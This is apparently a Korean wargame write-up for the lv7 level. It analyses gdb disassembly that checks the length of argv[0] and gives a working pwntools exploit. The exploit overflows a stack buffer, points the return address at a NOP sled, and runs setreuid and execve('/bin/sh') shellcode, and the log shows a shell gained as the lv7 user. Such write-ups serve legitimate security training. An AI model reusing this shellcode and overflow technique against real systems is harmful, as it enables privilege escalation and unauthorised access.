# Lv6 -> Lv7
## lv7
gdb를 이용해 lv7 바이너리의 추가된 부분을 분석해 보면 다음과 같다.


* main + 35
```asm
   0x08048523 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048526 <+38>:	mov    edx,DWORD PTR [eax]
   0x08048528 <+40>:	push   edx
   0x08048529 <+41>:	call   0x80483f0 <strlen@plt>
   0x0804852e <+46>:	add    esp,0x4
   0x08048531 <+49>:	mov    eax,eax
   0x08048533 <+51>:	cmp    eax,0x4d
   0x08048536 <+54>:	je     0x8048550 <main+80>		; jmp if (strlen(argv[0]) == 0x4d)
   0x08048538 <+56>:	push   0x804869c
   0x0804853d <+61>:	call   0x8048410 <printf@plt>
   0x08048542 <+66>:	add    esp,0x4
   0x08048545 <+69>:	push   0x0
   0x08048547 <+71>:	call   0x8048420 <exit@plt>
   0x0804854c <+76>:	add    esp,0x4
```

argv[0] 의 길이가 0x4d가 되어야 한다. argv[0]은 실행한 프로그램의 이름이다. 이 바이너리를 ./lv7로 실행하게 되면 './lv7'이 argv[0]가 된다. 이 문제를 해결하기 위해서는 argv[0]이 77바이트가 되어야 하므로 ./lv7을 ./ 반복해 77글자가 되도록 만들어 문제를 풀었다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argv1 = "a"*0x2c  +  "\x90\xd3\xff\xff"
argv2 = "\x90"*2000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

p = process(['./'*37 + 'lv7', argv1, argv2])
p.recvuntil('\n')
p.sendline('id')
p.recvuntil('\n')
p.sendline('my-pass')
p.interactive()
```
------

```
[+] Starting local process './././././././././././././././././././././././././././././././././././././lv7' argv=['./././././././././././././././././././././././././././././././././././././lv7', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\xd3\xff\xff', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'] : pid 40629
[DEBUG] Received 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  90 d3 ff ff  │aaaa│aaaa│aaaa│····│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2d bytes:
    'uid=1007(lv7) gid=1006(lv6) groups=1006(lv6)\n'
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[*] Switching to interactive mode
[DEBUG] Received 0x12 bytes:
    'do you know argv?\n'
do you know argv?
$ 
```